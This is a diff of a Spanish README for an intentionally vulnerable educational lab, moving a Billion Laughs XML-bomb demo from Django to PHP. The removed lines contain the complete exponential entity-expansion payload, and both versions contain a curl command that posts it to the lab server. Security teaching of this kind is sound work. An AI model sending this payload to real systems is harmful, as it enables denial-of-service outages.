@@ -1,75 +1,52 @@
-# BillionLaugh - Proyecto de Ejemplo Vulnerable a Ataques XML Billion Laughs
+# Proyecto Vulnerable - Ataque "Billion Laughs" en PHP
 
-Este proyecto es una aplicación web deliberadamente vulnerable desarrollada en Django para demostrar cómo funciona el ataque conocido como "Billion Laughs" o "XML Bomb". Está diseñado únicamente con fines educativos y para pruebas de seguridad en entornos controlados.
+⚠️ **¡ESTE PROYECTO ES INTENCIONALMENTE INSEGURO!**
 
-## ⚠️ Advertencia
-Este software contiene código intencionalmente vulnerable. No debe desplegarse en ambientes de producción ni en sistemas accesibles públicamente. Su uso está destinado únicamente a laboratorios de pruebas de penetración autorizadas o entornos de aprendizaje seguro.
+Este repositorio contiene un ejemplo **intencionalmente vulnerable** al ataque [Billion Laughs](https://wh01s17.vercel.app/blog/Ciberseguridad/dos_-_billion_laughs_attack). Es utilizado únicamente con fines educativos, pruebas de concepto y laboratorios controlados.
 
-## 🧪 ¿Qué es el ataque Billion Laughs?
-El ataque "Billion Laughs" es un tipo de ataque de denegación de servicio (DoS) contra analizadores XML que explota la expansión de entidades definidas recursivamente para generar una cantidad masiva de datos en memoria, agotando los recursos del sistema.
+---
 
-## 🛠️ Tecnologías utilizadas
-- Python 3.x
-- Django 4.x
-- `xml.etree.ElementTree` (vulnerable por defecto)
+## 📌 Descripción
 
-## 🚀 Cómo ejecutar el proyecto
-1. Clona este repositorio:
+El proyecto simula una API REST extremadamente simple (en PHP) que acepta una solicitud POST con datos XML y los procesa **sin protección** contra expansiones exponenciales de entidades.
 
-    ```bash
-    git clone https://github.com/wh01s17/billionlaugh_vuln.git
-    cd billionlaugh_vuln
-    ```
+Su propósito es demostrar cómo un mal uso del parser XML puede ser explotado para generar un **ataque de denegación de servicio (DoS)** conocido como *Billion Laughs*.
 
-2. Crea un entorno virtual e instala Django:
+---
 
-    ```bash
-    python -m venv venv
-    source venv/bin/activate   # En Windows usa `venv\Scripts\activate`
-    pip install django lxml
-    ```
+## 🔧 Requisitos
 
-3. Ejecuta las migraciones iniciales:
+- PHP 7.4 o superior
 
-    ```bash 
-    python manage.py migrate
-    ```
 
-4. Inicia el servidor:
-    ```bash
-    python manage.py runserver
-    ```
+No es necesario Apache/Nginx. Solo tienes que ejecutar el servidor integrado de PHP.
 
-5. Accede a la vista vulnerable:
-    ```bash
-    http://127.0.0.1:8000/api/parse/
-    ```
+## ▶️ Instrucciones de uso
+1. Levantar servidor
 
-🧪 Probar la vulnerabilidad
-Envía una solicitud POST a /api/parse/ con un payload como el siguiente:
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE lolz [
-    <!ENTITY lol "lol">
-    <!ELEMENT lolz (#PCDATA)>
-    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
-    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
-    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
-    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
-    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
-    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
-    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
-    <!ENTITY lol10 "&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;">
-    <!ENTITY lol11 "&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;">
-]>
-<lolz>&lol11;</lolz>
-```
+  ```bash
+  php -S 0.0.0.0:8000
+  ```
 
-Puedes usar herramientas como curl:
+Esto levanta el servicio en:
+  ```bash
+  http://TU_IP:8000/index.php
+  ```
+
+2. Enviar petición vulnerable
+Guarda el contenido de payload.xml y ejecuta:
+
 ```bash
-curl -X POST http://127.0.0.1:8000/api/parse/ -H "Content-Type: application/xml" --data-binary @payload.xml
+curl -X POST http://TU_IP:8000/index.php -H "Content-Type: application/xml" --data-binary @payload.xml
 ```
 
-Observa cómo el consumo de memoria crece exponencialmente al procesarse.
+La respuesta tomará mucho tiempo o provocará colapso del proceso php.
+
+## 🛑 Advertencia final
+⚠️ Este proyecto es SOLO para uso:
+
+- Académico
+- Investigación de seguridad controlada
+- Prácticas en laboratorios aislados
+
+**NUNCA debe utilizarse en sistemas públicos ni expuestos.**
